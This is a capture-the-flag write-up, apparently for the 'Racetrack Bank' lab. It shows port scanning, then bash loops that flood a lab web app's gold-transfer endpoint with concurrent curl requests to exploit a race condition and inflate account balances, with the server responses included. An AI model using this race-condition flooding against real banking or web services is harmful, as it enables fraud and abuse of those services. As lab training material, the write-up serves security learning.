# Racetrack Bank — Writeup

## Overview
### Racetrack Bank — Writeup
### Racetrack Bank — Writeup
----
It's time for another heist.
----
![](https://tryhackme-images.s3.amazonaws.com/room-icons/4dc3ec5fff2bed9041875393f0f72a1e.jpeg)
Start Machine
Hack into the machine and capture both the user and root flags! It's pretty hard, so good luck.
Answer the questions below

## Enumeration
```text
┌──(witty㉿kali)-[~/Downloads]
└─$ rustscan -a 10.10.198.17 --ulimit 5500 -b 65535 -- -A -Pn
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
Real hackers hack time ⌛

[~] The config file is expected to be at "/home/witty/.rustscan.toml"
[~] Automatically increasing ulimit value to 5500.
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
Open 10.10.198.17:22
Open 10.10.198.17:80
[~] Starting Script(s)
[>] Script to be run Some("nmap -vvv -p {{port}} {{ip}}")

Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
[~] Starting Nmap 7.93 ( https://nmap.org )
NSE: Loaded 155 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE
Completed NSE
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE
Completed NSE
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE
Completed NSE
Initiating Parallel DNS resolution of 1 host.
Completed Parallel DNS resolution of 1 host.
DNS resolution of 1 IPs took 0.02s. Mode: Async [#: 1, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating Connect Scan
Scanning 10.10.198.17 [2 ports]
Discovered open port 80/tcp on 10.10.198.17
Discovered open port 22/tcp on 10.10.198.17
Completed Connect Scan (2 total ports)
Initiating Service scan
Scanning 2 services on 10.10.198.17
Completed Service scan (2 services on 1 host)
NSE: Script scanning 10.10.198.17.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE
Completed NSE
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE
Completed NSE
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE
Completed NSE
Nmap scan report for 10.10.198.17
Host is up, received user-set (0.22s latency).

PORT   STATE SERVICE REASON  VERSION
22/tcp open  ssh     syn-ack OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 519153a5af1a5a786762aed637a08e33 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCxnwgBjCjyJ+aWd6heYTvHySh7tEBlAO3Jv/wzZZe1Qo0dj4ZLzGohKkWBfsqH3zXqQn+nWOXKjLNMlGSfPmSNVtY5vWa+SNHZIkvyILsv0NgoPwU4QB4TVP5DCGiz6tBYk92j26vLmP0kxD+sd7KNmmRHnjrVd8WhWhjGCzcGUte5tAnxNGHZUPyX9o6m0LsbC1goWrQSyJ6dGFtausj5IzVGA9wO+vJD577KMy74QvLywLEe8KkNsjbejBphFsmz849OE9fq0Y+cfZbIdYQtQCD0ARC5SCluZ+c8BUB3G+c7ZanGyIzWV695dKYR/dru7/ElBT9xkwMlNZf2giNv
|   256 c17072cc82c3f33e5e0a6a054ef04c3c (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBKgVewqlT05Af1S9+0VideqdvN07wONAqm8iHSiQ/9mD3WS6uAeJzdfz8uX328uXfpaynISu12WuBQkki+1iYQY=
|   256 a2ea537ce1d760bcd39208a99d206b7d (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIHg5lLniSCVt74z0uR1M/dCYjDnVWT8PdHCIJjk5eH5J
80/tcp open  http    syn-ack nginx 1.14.0 (Ubuntu)
|_http-server-header: nginx/1.14.0 (Ubuntu)
|_http-title: 502 Bad Gateway
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE
Completed NSE
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE
Completed NSE
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE
Completed NSE
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 21.46 seconds

Welcome to racetrack bank, the bank that (will soon) let you transfer funds with racing speed! 

creating an acc
POST /api/create HTTP/1.1
Cookie: connect.sid=s%3A_41Hrgv7gl7l4asuESZn1yY3iUeRDZ-2.YZR2xutiObhIw9kYf4%2BYFJvXD%2F7jx0YLtkgGfeAKajw
username=witty&password=witty123&password2=witty123

Welcome to Racetrack Bank! To get you started, we have given you 1 gold (how generous of us!). Spend it wisely.

http://10.10.198.17/purchase.html

Premium Account 	This is our famous premium account. It may seem a bit overpriced, but it's totally worth it! It gives you access to some juicy extra features to play with!
What's that? You want to know what the features are? It's a surprise... 	10,000 gold 

You do not have enough gold.

changing to 200 ok

http://10.10.198.17/api/buypremium
Found. Redirecting to /purchase.html?error=You%20do%20not%20have%20enough%20gold.

http://10.10.198.17/giving.html

We're all about the generosity here at Racetrack Bank. Use the form below to give gold to your friends!

Note: to see if you have recieved gold, you will need to refresh your page.
Username: Amount of Gold: 

so we can create another acc

test:test123

cookie
s%3AcA-fvilK7YTPyttaAaT7T3GzsiJBRXh4.8xcpht6d5lKmHv%2F7ybtGOLULk4uw39D%2BTdr8rZn3ggI

giving gold 1 to test

Gold: 2 yes it works

https://www.npmjs.com/package/racetrack

Racetrack is a way to make sure that all your async calls are completed, and to find out where they went wrong if any of them are not completed.

#!/bin/bash
```

## Exploitation
```text
# Loop a curl request and make the request pretty much asyncronous by using &. sleep for .1

┌──(witty㉿kali)-[~/Downloads]
└─$ for i in {1..10000}; do sleep .1; curl -i -s -k -X $'POST' \
    -H $'Host: 10.10.198.17' -H $'Referer: http://10.10.198.17/giving.html' -H $'Content-Type: application/x-www-form-urlencoded' -H $'Connection: close' -H $'Cookie: connect.sid=s%3AcA-fvilK7YTPyttaAaT7T3GzsiJBRXh4.8xcpht6d5lKmHv%2F7ybtGOLULk4uw39D%2BTdr8rZn3ggI' -H $'Upgrade-Insecure-Requests: 1' \
    -b $'s%3A_41Hrgv7gl7l4asuESZn1yY3iUeRDZ-2.YZR2xutiObhIw9kYf4%2BYFJvXD%2F7jx0YLtkgGfeAKajw' \
    --data-binary $'user=witty&amount=1' \
    $'http://10.10.198.17/api/givegold' & done

witty gold 16

┌──(witty㉿kali)-[~/Downloads]
└─$ for i in {1..10000}; do sleep .1; curl -i -s -k -X $'POST' \
    -H $'Host: 10.10.198.17' -H $'Referer: http://10.10.198.17/giving.html' -H $'Content-Type: application/x-www-form-urlencoded' -H $'Connection: close' -H $'Cookie: connect.sid=s%3A_41Hrgv7gl7l4asuESZn1yY3iUeRDZ-2.YZR2xutiObhIw9kYf4%2BYFJvXD%2F7jx0YLtkgGfeAKajw' -H $'Upgrade-Insecure-Requests: 1' \
    -b $'s%3AcA-fvilK7YTPyttaAaT7T3GzsiJBRXh4.8xcpht6d5lKmHv%2F7ybtGOLULk4uw39D%2BTdr8rZn3ggI' \
    --data-binary $'user=test&amount=5' \
    $'http://10.10.198.17/api/givegold' & done

then witty 1 and test 130 incrementing amount to 100 let's see

┌──(witty㉿kali)-[~/Downloads]
└─$ for i in {1..10000}; do sleep .1; curl -i -s -k -X $'POST' \
    -H $'Host: 10.10.198.17' -H $'Referer: http://10.10.198.17/giving.html' -H $'Content-Type: application/x-www-form-urlencoded' -H $'Connection: close' -H $'Cookie: connect.sid=s%3AcA-fvilK7YTPyttaAaT7T3GzsiJBRXh4.8xcpht6d5lKmHv%2F7ybtGOLULk4uw39D%2BTdr8rZn3ggI' -H $'Upgrade-Insecure-Requests: 1' \
    -b $'s%3A_41Hrgv7gl7l4asuESZn1yY3iUeRDZ-2.YZR2xutiObhIw9kYf4%2BYFJvXD%2F7jx0YLtkgGfeAKajw' \
    --data-binary $'user=witty&amount=100' \
    $'http://10.10.198.17/api/givegold' & done

then witty 1001 let's give 1000 to test

and test has Gold: 9030 

┌──(witty㉿kali)-[~/Downloads]
└─$ for i in {1..10000}; do sleep .1; curl -i -s -k -X $'POST' \
    -H $'Host: 10.10.198.17' -H $'Referer: http://10.10.198.17/giving.html' -H $'Content-Type: application/x-www-form-urlencoded' -H $'Connection: close' -H $'Cookie: connect.sid=s%3A_41Hrgv7gl7l4asuESZn1yY3iUeRDZ-2.YZR2xutiObhIw9kYf4%2BYFJvXD%2F7jx0YLtkgGfeAKajw' -H $'Upgrade-Insecure-Requests: 1' \
    -b $'s%3AcA-fvilK7YTPyttaAaT7T3GzsiJBRXh4.8xcpht6d5lKmHv%2F7ybtGOLULk4uw39D%2BTdr8rZn3ggI' \
    --data-binary $'user=test&amount=1000' \
    $'http://10.10.198.17/api/givegold' & done

and finally from test to witty :) 

┌──(witty㉿kali)-[~/Downloads]
└─$ for i in {1..10000}; do sleep .1; curl -i -s -k -X $'POST' \
    -H $'Host: 10.10.198.17' -H $'Referer: http://10.10.198.17/giving.html' -H $'Content-Type: application/x-www-form-urlencoded' -H $'Connection: close' -H $'Cookie: connect.sid=s%3AcA-fvilK7YTPyttaAaT7T3GzsiJBRXh4.8xcpht6d5lKmHv%2F7ybtGOLULk4uw39D%2BTdr8rZn3ggI' -H $'Upgrade-Insecure-Requests: 1' \
    -b $'s%3A_41Hrgv7gl7l4asuESZn1yY3iUeRDZ-2.YZR2xutiObhIw9kYf4%2BYFJvXD%2F7jx0YLtkgGfeAKajw' \
    --data-binary $'user=witty&amount=5000' \
    $'http://10.10.198.17/api/givegold' & done
[2] 840068
[3] 840070
[4] 840072
[5] 840074
[6] 840076
[7] 840078
[8] 840084
[9] 840086
[10] 840088
[11] 840090
[12] 840092
[13] 840094
[14] 840096
[15] 840098
[16] 840100
HTTP/1.1 302 Found
HTTP/1.1 302 Found
Server: nginx/1.14.0 (Ubuntu)
Server: nginx/1.14.0 (Ubuntu)
Date: Wed, 12 Jul 2023 00:03:21 GMT
Date: Wed, 12 Jul 2023 00:03:21 GMT
Content-Type: text/plain; charset=utf-8
Content-Type: text/plain; charset=utf-8
Content-Length: 51
Connection: close
X-Powered-By: Express
Cache-Control: no-store
Content-Length: 79
Connection: close
Location: /giving.html?success=Success!
X-Powered-By: Express
Vary: Accept
Cache-Control: no-store

Location: /giving.html?error=You%20do%20not%20have%20enough%20gold.
Vary: Accept

Found. Redirecting to /giving.html?success=Success!Found. Redirecting to /giving.html?error=You%20do%20not%20have%20enough%20gold.[3]    done       curl -i -s -k -X $'POST' -H $'Host: 10.10.198.17' -H  -H  -H  -H  -H  -b    
[12]    done       curl -i -s -k -X $'POST' -H $'Host: 10.10.198.17' -H  -H  -H  -H  -H  -b    
[3] 840106
HTTP/1.1 302 Found
Server: nginx/1.14.0 (Ubuntu)
Date: Wed, 12 Jul 2023 00:03:21 GMT
Content-Type: text/plain; charset=utf-8
Content-Length: 51
Connection: close
X-Powered-By: Express
Cache-Control: no-store
Location: /giving.html?success=Success!
Vary: Accept

Found. Redirecting to /giving.html?success=Success![4]    done       curl -i -s -k -X $'POST' -H $'Host: 10.10.198.17' -H  -H  -H  -H  -H  -b    
[4] 840108
HTTP/1.1 302 Found
Server: nginx/1.14.0 (Ubuntu)
Date: Wed, 12 Jul 2023 00:03:21 GMT
Content-Type: text/plain; charset=utf-8
Content-Length: 79
Connection: close
X-Powered-By: Express
Cache-Control: no-store
Location: /giving.html?error=You%20do%20not%20have%20enough%20gold.
Vary: Accept

Found. Redirecting to /giving.html?error=You%20do%20not%20have%20enough%20gold.HTTP/1.1 302 Found
Server: nginx/1.14.0 (Ubuntu)
Date: Wed, 12 Jul 2023 00:03:21 GMT
Content-Type: text/plain; charset=utf-8
Content-Length: 51
Connection: close
X-Powered-By: Express
Cache-Control: no-store
Location: /giving.html?success=Success!
Vary: Accept

Gold: 40001  Race conditions

let's purchase premium acc

http://10.10.198.17/premiumfeatures.html

X-Powered-By: Express

process.cwd()

The answer is /home/brian/website.
